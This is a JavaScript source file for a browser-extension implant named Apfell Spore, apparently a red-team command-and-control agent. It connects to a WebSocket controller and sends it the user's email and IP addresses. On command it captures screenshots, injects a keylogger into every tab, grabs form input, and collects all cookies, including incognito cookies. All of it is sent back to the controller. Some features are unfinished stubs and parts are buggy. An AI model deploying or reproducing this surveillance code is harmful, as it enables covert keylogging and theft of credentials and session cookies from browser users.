// Apfell Spore Core Code
// Author: Chris Ross
// Purpose: Apfell Chrome Extension

// Core Spore Class
class SporeConfiguration {
    constructor(uuid, serveraddress, endpoint, port, ssl){
        if (ssl === true) {
            this.serverurl = "wss://"+serveraddress+":"+port+"/"+endpoint;
        } else {
            this.serverurl = "ws://"+serveraddress+":"+port+"/"+endpoint;
        }

        this.apfellID = 0;
        this.keyID = "";
        this.username = chrome.identity.getProfileUserInfo(function(userinfo){
            return userinfo.email;
        });
        this.pid = chrome.instanceID.getID();
        this.UUID = uuid;
        // TODO: Add properties for the RSA and AES keys
    }
}

const config = new SporeConfiguration("Unique Identifier", "localhost", "websocket", 454, true);
// Connect to the server
const connection = new WebSocket(config.serverurl);
let out = [];
let keylogTaskID = 0;
let keyloggers = [];
// Helper functions

/// TODO: Implement CreateKeyExchangeMessage function

/// Create a Callback Checkin Message
function CreateCallbackCheckInMessage(username, uuid, pid, addresses) {
    const msg = {};
    msg.user = username;
    msg.processid = pid;
    msg.uuid = uuid;
    msg.addresses = addresses;

    return msg;
}

function CreateApfellMessage(type, apfellID, uuid, size, taskid, tasktype, data) {
    const msg = {};
    msg.type = type;
    msg.id = apfellID;
    msg.uuid = uuid;
    msg.size = size;
    msg.taskid = taskid;
    msg.tasktype = tasktype;
    msg.data =  data;

    return msg;
}
/// Get the local IP addresses
function GetLocalIP(options) {
    const ips = [];
    const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection;

    const pc = new RTCPeerConnection({
        iceServers : []
    });

    pc.createDataChannel('');
    pc.onicecandidate = function(e) {
        if (!e.candidate) {
            pc.close();
            callback(ips);
        }
        const ip = /^candidate:.+ (\S+) \d+ typ/.exec(e.candidate.candidate)[1];
        if (ips.indexOf(ip) === -1)
            ips.push(ip);
    };

    pc.createOffer(function (sdp) {
        pc.setLocalDescription(sdp);
    }, function onerror() {
    });
}
/// Convert a base64 string to data array
function base64StringToDataArray(data) {
    const byteString = atob(data);
    // write the bytes of the string to an ArrayBuffer
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }

    return ia;
}

/// Make an HTTP Request
function httpReq(url,method,headers,body)
{
    const xmlHttp = new XMLHttpRequest();
    xmlHttp.open( method, url, false ); // false for synchronous request
    for (const p in headers) {
        if(headers.hasOwnProperty(p)) {
            xmlHttp.setRequestHeader(p, headers[p])
        }
    }
    console.log(body);
    const data_array = base64StringToDataArray(body);
    xmlHttp.send(data_array);
    return xmlHttp;
}

setInterval(function(){
    if (out.length > 0){
        // Pop and send a message to the controller
        const msg = out.shift();
        connection.send(msg);
    }
}, 5000);

// TODO: Add helper functions to create Key Exchange, Callback Checkin, and Apfell Task Request messages

(function(){
    // Main function
    /// Receives and processes messages
    // Add a new listener to continually retrieve messages
    chrome.runtime.onMessage.addListener(function(message, sender, callback) {
        // Listen for events from other scripts
        switch (message.type) {
            case 'keylogInit' : {
                keyloggers.push(sender.tab.id);
                break;
            }
            case 'keylogExit' : {
                const index = keyloggers.indexOf(sender.tab.id);
                if (index !== -1) keyloggers.splice(index, 1);
                break;
            }
            case 'keylogData' : {
                let keylogMessage = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, 2, message.data);
                out.push(JSON.stringify(keylogMessage, null, 2));
                break;
            }
            case 'formData' : {
                let formCaptureMessage = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, 2, message.data);
                out.push(JSON.stringify(formCaptureMessage, null, 2));
                break;
            }

        }
    });
    
    connection.onopen = function() {
        console.log('Connection received');
        // TODO: Add code for creating a key message and then sending the message to the server
        connection.send('init '+ ID);
    };
    
    connection.onclose = function(){
        console.log('Connection closed');
    };

    connection.onerror = function(error){
        console.log('WS Error detected: ' + error);
    };
    
    // handle messages from other events
    connection.onmessage = function (e) {
        // Message format
        // MetaType
        /// 1 - Key Exchange | 2 - Callback Checkin | Apfell Task Message
        // MetaData
        /// Key Exchange - {String : KeyID, Int : Stage, String : Key}
        /// Callback Checkin - {String : KeyID, Int : PID, String : User, String : UUID, String : Host, String : IP}
        /// Apfell Task Message

        const message = JSON.parse(e.data);
        
        switch (message["metatype"]) {
            case 1 : {
                // Encryption not implemented
                const keyexchangedata = message["metadata"];
                
                // 2 - Key Exchange Response from the server
                if (keyexchangedata["stage"] === 1) {
                    const decodedkey = base64StringToDataArray(keyexchangedata["key"]);
                    // TODO: Implement RSA decryption
                }

                if (keyexchangedata["stage"] === 2) {
                    // Send the checkin data

                    // We can use the unique device ID as a hostname since we can't retrieve the actual hostname
                    const localAddresses = GetLocalIP();

                    const checkInMessage = CreateCallbackCheckInMessage(config.username, config.UUID, config.pid, localAddresses);
                    const envelope = JSON.stringify(checkInMessage, null, 2);
                    out.push(envelope);
                }

                break;
            }
            case 2 : {
                // response to callback check in
                const checkindata = message["metadata"];
                config.apfellID = checkindata["apfellid"];
                break;
            }
            case 3 : {
                // process an apfell message

                const data = message["metadata"];
                const taskid = data["taskid"];
                const tasktype = data["tasktype"];

                if (tasktype === 1) {
                    // Screenshot
                    chrome.tabs.captureVisibleTab(null, function(img) {
                        // send back the base64encoded image
                        const encodedImage = btoa(unescape(encodeURIComponent(img.toString())));
                        const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, encodedImage.length, taskid, tasktype, encodedImage);
                        const envelope = JSON.stringify(apfellmsg, null, 2);
                        out.push(envelope);
                    });
                } else if (tasktype === 2) {
                    // Keylog
                    const queryInfo = {};
                    keylogTaskID = taskid;

                    // Set capture forms to true
                    chrome.storage.local.set({'formGrabber': true});

                    // Inject the keylogger script into every tab
                    chrome.tabs.query(queryInfo, function(result) {
                        for (i = 0; i < result.length; i++) {
                            let ind = keyloggers.indexOf(result[i].id);
                            if (ind === -1) {
                                // Only inject the keylogger if it isn't already running
                                chrome.tabs.executeScript(result[i].id, {
                                    file: "src/bg/keylogger.js"
                                });
                            }
                        }
                    });
                } else if (tasktype === 3) {
                    // Get all cookies. Includes incognito cookies
                    let results = [];
                    chrome.cookies.getAllCookieStores(function(stores){
                        stores.forEach(function(store){
                            const filter = {};
                            filter["storeId"] = store.id;
                            chrome.cookies.getAll({"storeId": store.id}, function(cookies){
                                results = results.concat(cookies);
                            });
                        });
                    });

                    const data = JSON.stringify(results, null, 2);
                    const envelope = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
                    out.push(envelope);

                } else if (tasktype === 4) {
                    // TODO: Implement task code for setting a cookie value
                }
            }
        }
        
    }
})();
